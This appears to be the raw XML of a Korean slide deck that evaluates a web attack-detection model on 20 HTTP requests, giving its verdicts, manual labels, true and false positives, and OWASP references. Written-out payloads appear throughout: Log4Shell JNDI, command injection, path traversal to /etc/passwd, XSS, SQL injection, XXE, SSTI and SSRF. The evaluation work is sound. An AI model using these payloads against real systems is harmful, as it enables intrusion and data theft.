              <a:t>GET / HTTP/1.1\r\nHost: host-11\r\nUser-Agent: ${jndi:ldap\://192.0.2.123:1389/test-only}\r\nX-Test-Marker: AI-EVAL-9006</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>분류 기준 참고:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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20개 HTTP 요청과 모델 출력. S01~S20은 제공 순서로 부여한 보고서 식별자이며 티켓 ID와 매핑되지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S16 수동=공격 모델=공격 화면값=0.60 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1%3Bid%3Buname%20-a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S17 수동=공격 모델=공격 화면값=0.63 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: host-41\r\nAccept: application/octet-stream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S18 수동=공격 모델=공격 화면값=0.45 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/](https://host-3/)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S19 수동=공격 모델=공격 화면값=0.57 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /login HTTP/1.1\r\nHost: host-31\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin%27%20AND%20SLEEP%285%29--&amp;password=test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S20 수동=공격 모델=공격 화면값=1.00 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /products?id=10%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>분류 기준 참고:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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개별 화면 값은 사용자 명칭 “정확도”를 보존한다. 산식이 제공되지 않았으므로 확률, 신뢰도, 유사도로 단정하지 않는다. 각 값의 단순 평균은 모델 정확도가 아니다. 점수와 판정은 사용자 제공 원값이며 차트 데이터는 편집 가능한 리터럴 값이다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S01 0.47 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S02 0.39 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S03 0.48 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S04 0.30 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S05 0.31 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S06 0.60 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S07 0.35 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S08 0.43 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S09 0.27 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S10 0.65 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S11 0.43 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S12 0.46 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S13 0.37 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S14 0.67 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S15 0.51 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S16 0.60 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S17 0.63 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S18 0.45 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S19 0.57 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S20 1.00 공격 TP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권고는 관측 결과(FP 6건)에 대한 후속 검증 제안이며 이미 수행했다는 의미가 아니다. eyeCloudXOARforAll-in-one_v4_ko.pdf p263–266은 Label 변경, 임시저장, Feedback, 강화학습의 별도 절차를 설명한다. 학습/평가 분리 여부와 활성 모델 메타데이터는 사용자 제공 자료에서 확인되지 않았다.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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S01</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /redirect?next=%2Fhome HTTP/1.1\r\nHost: host-37\r\nConnection: close</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.47 모델=공격 수동=정상 결과=FP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S02</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /upload HTTP/1.1\r\nHost: host-11\r\nContent-Type: multipart/form-data; boundary=EVALBOUNDARY\r\n\r\n--EVALBOUNDARY\r\nContent-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityData/event-11.dat"</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.39 모델=정상 수동=정상 결과=TN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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S03</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /login HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=user01&amp;password=incorrect-password</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.48 모델=공격 수동=정상 결과=FP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S04</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /health HTTP/1.1\r\nHost: host-22\r\nUser-Agent: kube-probe/1.30\r\nAccept: */*</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.30 모델=정상 수동=정상 결과=TN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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S05</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /api/search HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/json\r\n\r\n{"operator":"union","fields":["name","department"],"page":1}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.31 모델=공격 수동=정상 결과=FP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S06</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1&amp;count=4</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.60 모델=공격 수동=정상 결과=FP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S07</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /download?file=quarterly..final.pdf HTTP/1.1\r\nHost: host-41\r\nAccept: application/pdf</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.35 모델=정상 수동=정상 결과=TN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S08</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /docs/search?q=HTML%20script%20element%20reference HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/docs](https://host-3/docs)</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.43 모델=공격 수동=정상 결과=FP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S09</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /search?q=how%20to%20select%20a%20health%20plan HTTP/1.1\r\nHost: host-31\r\nAccept: text/html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.27 모델=정상 수동=정상 결과=TN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S10</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /products?id=10&amp;sort=price&amp;direction=asc HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.65 모델=공격 수동=정상 결과=FP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S11</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true HTTP/1.1\r\nHost: host-37\r\nConnection: close</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.43 모델=공격 수동=공격 결과=TP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S12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /api/import HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/xml\r\n\r\n%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.46 모델=공격 수동=공격 결과=TP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S13</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /welcome?name=%7B%7B7\*7%7D%7D HTTP/1.1\r\nHost: host-11\r\nAccept: text/html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.37 모델=공격 수동=공격 결과=TP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S14</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /preview HTTP/1.1\r\nHost: host-22\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nurl=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.67 모델=공격 수동=공격 결과=TP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S15</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET / HTTP/1.1\r\nHost: host-11\r\nUser-Agent: ${jndi:ldap\://192.0.2.123:1389/test-only}\r\nX-Test-Marker: AI-EVAL-9006</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.51 모델=공격 수동=공격 결과=TP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S16</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1%3Bid%3Buname%20-a</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.60 모델=공격 수동=공격 결과=TP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지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S17</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: host-41\r\nAccept: application/octet-stream</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.63 모델=공격 수동=공격 결과=TP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S18</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/](https://host-3/)</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.45 모델=공격 수동=공격 결과=TP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제공 원문을 보존했다. 슬라이드의 실제 줄바꿈은 가독성을 위한 것이며 원래의 전송 경계를 뜻하지 않는다. Literal \r\n을 제거하거나 실제 CRLF로 디코딩하지 않았다.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S19</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /login HTTP/1.1\r\nHost: host-31\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin%27%20AND%20SLEEP%285%29--&amp;password=test</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=0.57 모델=공격 수동=공격 결과=TP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S20</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /products?id=10%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>화면 값=1.00 모델=공격 수동=공격 결과=TP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제공 자료: 이 대화의 20개 샘플 및 20개 티켓, 첨부 원본 PNG.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>로컬 자료: C:/Users/user/Desktop/project/LogGenerator/README.md 264–275행. C:/Users/user/Desktop/AI 서버/eyeCloudXOARforAll-in-one_v4_ko.pdf p263–269. C:/Users/user/Desktop/AI 서버/eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>웹 1차 출처(2026-09-09 확인):</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>sql: https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>path: https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>crlf: https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>xxe: https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>ssti: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>ssrf: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>log4j: https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>command: https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>probes: https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>auth: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>rfc: https://www.rfc-editor.org/info/rfc5737/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>이전 로컬 ai_model_detection_samples.json은 메서드·헤더·정상군이 현재 제공 데이터와 달라 평가에 대체 사용하지 않았다.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fd4ed9e26f45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bd8dbbdadc42fa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="/ppt/slideLayouts/slideLayout1.xml" Id="Rba78b1900cf94f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78b1900cf94f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8a7afcbdf148dd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide1.xml" Id="R5e8eac8d6b3f4d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f48315ac994531" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide2.xml" Id="R7d77b78025734c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5a917b6ee441e7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide3.xml" Id="R8a3b5533a2af48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544b002888448f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide4.xml" Id="Reb32f84cf4b6478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62c2a350c74b6f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide5.xml" Id="R29405dff9a464c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5e38d20e0a4f07" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/ppt/media/image.png" Id="R0423ea0856304b74" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide6.xml" Id="Re413434f589342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a768dab3e640ff" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide7.xml" Id="R75970c60632c4ad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455623f164434a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide8.xml" Id="Rbfcfb029aa3a44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ee875538dc4204" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide9.xml" Id="Rcb350dad491949d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5b353b71e74095" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide10.xml" Id="R22e080d464684b9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b459ae8e7a477b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide11.xml" Id="Ra2d6bed27ba94ae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9705c90213466b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide12.xml" Id="R3a1c13472bf043f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2fe3c497834f6f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="/ppt/slides/charts/chart1.xml" Id="Rfba8ca367a4942e2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide13.xml" Id="Rb20238c078fc488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ce95111efd4dfd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide14.xml" Id="R9bffa4b571e8482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c2fe5d021c4192" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide15.xml" Id="R859505a746714c9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5280e92fca4911" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide16.xml" Id="Rade8a83ea2b745c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389b257fa34748" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide17.xml" Id="R581a817ac2bd4b1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dea9f172e74e0e" /><Relationship 